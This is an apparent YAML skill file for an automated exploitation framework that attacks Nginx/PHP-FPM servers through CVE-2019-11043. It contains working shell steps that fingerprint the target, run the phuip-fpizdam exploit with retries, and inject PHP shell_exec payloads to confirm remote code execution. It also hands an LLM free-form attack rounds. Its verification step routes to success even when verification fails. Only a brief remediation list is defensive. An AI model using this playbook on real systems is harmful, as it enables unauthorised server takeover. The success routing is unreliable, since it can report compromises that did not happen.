# ═══════════════════════════════════════════════════════════
# PHP-FPM CVE-2019-11043 — Nginx + PHP-FPM RCE
#
# v2: 使用 phuip-fpizdam 工具（https://github.com/neex/phuip-fpizdam）
#     替代手工 QSL 爆破
# ═══════════════════════════════════════════════════════════
skill_id: php_fpm_rce
name: "PHP-FPM Nginx 缓冲区溢出 RCE (CVE-2019-11043)"
category: web_rce
version: "2.0"

principle: |
  Nginx + PHP-FPM 配置中使用 fastcgi_split_path_info 时，
  特定 URL 路径导致 env_path_info 下溢，可注入 PHP_VALUE
  覆盖 php.ini 配置（如 auto_prepend_file=php://input），
  使后续 POST body 被当作 PHP 代码执行。

  phuip-fpizdam 工具自动完成 QSL 探测和 payload 注入。
  注入后任何 PHP 请求的 POST body 都会被执行（但只影响部分 worker）。

match:
  rules:
    - fingerprint_contains: ["nginx", "php"]
    - fingerprint_contains: ["php-fpm"]
    - evidence_contains: ["php-fpm", "CVE-2019-11043"]
    - evidence_contains: ["nginx", "php"]
    - cve_matches: ["CVE-2019-11043"]

probes:
  - id: confirm_env
    description: "确认 Nginx + PHP 环境"
    steps:
      - command: |
          resp=$(curl -s -D - {ENDPOINT}/index.php --max-time 10 2>/dev/null)
          echo "$resp" | head -30
          if echo "$resp" | grep -qi "nginx"; then echo "NGINX_CONFIRMED"; fi
          if echo "$resp" | grep -qi "X-Powered-By.*PHP\|PHP/"; then echo "PHP_CONFIRMED"; fi
          # 测试 PATH_INFO
          code=$(curl -s -o /dev/null -w "%{http_code}" "{ENDPOINT}/index.php/test" --max-time 8 2>/dev/null)
          echo "PATHINFO_STATUS:${code}"
          if [ "$code" != "000" ] && [ "$code" != "403" ]; then echo "PATHINFO_WORKS"; fi
        parse_rules:
          - if_contains: ["NGINX_CONFIRMED"]
            set: { nginx_confirmed: true }
          - if_contains: ["PHP_CONFIRMED"]
            set: { php_confirmed: true }
          - if_contains: ["PATHINFO_WORKS"]
            set: { pathinfo_works: true }

exploit_paths:
  # ═══ 路径 A: phuip-fpizdam 自动利用 ═══
  - path_id: phuip_fpizdam
    name: "phuip-fpizdam 自动利用"
    priority: 1
    principle: |
      phuip-fpizdam 自动完成 QSL 探测和 PHP_VALUE 注入。
      成功后输出 "Attack params found" 或 "Success"。
      注入后需要多次发送 POST 请求命中被污染的 worker 来验证 RCE。
    conditions:
      nginx_confirmed: true
    steps:
      - id: run_fpizdam
        description: "phuip-fpizdam 探测并注入"
        command: |
          echo "[*] 运行 phuip-fpizdam..."
          # 运行工具（可能需要多次尝试）
          output=$(/opt/phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
          echo "$output"

          if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
            echo "FPIZDAM_INJECT_SUCCESS"
          fi
        timeout: 120
        success_criteria:
          stdout_contains_any: ["FPIZDAM_INJECT_SUCCESS", "Success", "Was able to execute"]
        on_success: verify_rce
        on_fail: fpizdam_retry
        evidence_capture:
          shell_type: "rce_php_fpm_fpizdam"

      - id: fpizdam_retry
        description: "重试 phuip-fpizdam（有时需要多次）"
        command: |
          for attempt in 1 2 3; do
            echo "[*] phuip-fpizdam 重试 #$attempt..."
            output=$(/opt/phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
            echo "$output"
            if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
              echo "FPIZDAM_INJECT_SUCCESS"
              break
            fi
            sleep 2
          done
        timeout: 300
        success_criteria:
          stdout_contains_any: ["FPIZDAM_INJECT_SUCCESS", "Success", "Was able to execute"]
        on_success: verify_rce
        on_fail: next_path

      - id: verify_rce
        description: "验证 RCE — 多次发送 POST 命中被污染的 worker"
        command: |
          echo "[*] 验证 RCE（多次尝试命中被污染的 worker）..."
          for i in $(seq 1 30); do
            result=$(curl -s -X POST "{ENDPOINT}/index.php?a=id" \
              -d "<?php echo 'PHP_FPM_RCE_' . shell_exec('id'); ?>" \
              --max-time 5 2>/dev/null)
            if echo "$result" | grep -q "uid="; then
              echo "[+] 命中！"
              echo "$result"
              echo "PHP_FPM_RCE_CONFIRMED"
              exit 0
            fi
            # 也试 phuip-fpizdam 注入后的参数方式
            result2=$(curl -s "{ENDPOINT}/index.php?a=/bin/sh+-c+id" --max-time 5 2>/dev/null)
            if echo "$result2" | grep -q "uid="; then
              echo "[+] 参数方式命中！"
              echo "$result2"
              echo "PHP_FPM_RCE_CONFIRMED"
              exit 0
            fi
          done
          echo "VERIFY_FAILED"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["uid=", "PHP_FPM_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: conclude_success
        evidence_capture:
          shell_type: "rce_php_fpm"

  # ═══ 路径 B: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理（限定 PHP-FPM 范围）"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      nginx_confirmed: true

remediation: |
  1. 升级 PHP 至 7.1.33 / 7.2.24 / 7.3.11 或更高版本
  2. 修改 Nginx 配置，移除 fastcgi_split_path_info
  3. 添加 try_files $uri =404